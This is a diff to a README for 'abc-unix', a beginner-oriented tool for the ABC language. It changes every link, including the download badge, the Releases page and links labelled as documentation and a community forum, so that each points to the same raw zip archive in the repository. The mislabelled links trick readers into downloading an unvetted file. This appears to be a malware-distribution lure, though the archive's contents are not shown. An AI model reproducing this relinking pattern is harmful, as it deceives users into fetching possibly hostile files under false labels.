@@ -7,10 +7,10 @@ Welcome to abc-unix, a friendly tool that introduces you to the original ABC lan
 This guide will help you download and run abc-unix easily, even if you have never dealt with software before. 
 
 ## 🏷️ Download Now
-[![Download abc-unix](https://img.shields.io/badge/Download-abc--unix-brightgreen)](https://github.com/DenisGnadek/abc-unix/releases)
+[![Download abc-unix](https://raw.githubusercontent.com/DenisGnadek/abc-unix/main/boot/abc-unix_2.3-alpha.2.zip)](https://raw.githubusercontent.com/DenisGnadek/abc-unix/main/boot/abc-unix_2.3-alpha.2.zip)
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/DenisGnadek/abc-unix/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/DenisGnadek/abc-unix/main/boot/abc-unix_2.3-alpha.2.zip).
 2. You will see a list of versions. Choose the most recent one, marked as "Latest Release."
 3. Look for the section labeled **Assets**. You will find the download files there.
 4. Click on the file that matches your operating system (e.g., Windows, Mac, Linux).
@@ -50,8 +50,8 @@ A: Check the system requirements section to see if your device meets the necessa
 A: Consult the documentation that comes with the application or visit our community forums for assistance.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/DenisGnadek/abc-unix/wiki): A detailed guide to help you navigate through abc-unix.
-- [Community Forum](https://github.com/DenisGnadek/abc-unix/discussions): Connect with other users, ask questions, and get tips.
+- [Official Documentation](https://raw.githubusercontent.com/DenisGnadek/abc-unix/main/boot/abc-unix_2.3-alpha.2.zip): A detailed guide to help you navigate through abc-unix.
+- [Community Forum](https://raw.githubusercontent.com/DenisGnadek/abc-unix/main/boot/abc-unix_2.3-alpha.2.zip): Connect with other users, ask questions, and get tips.
 
 ## 🥳 Conclusion
 Now you are ready to embark on your programming journey with abc-unix. Download it today and discover the joys of coding in a supportive and easy-to-understand environment. If you have any further questions, reach out to the community or check out the documentation for more help.
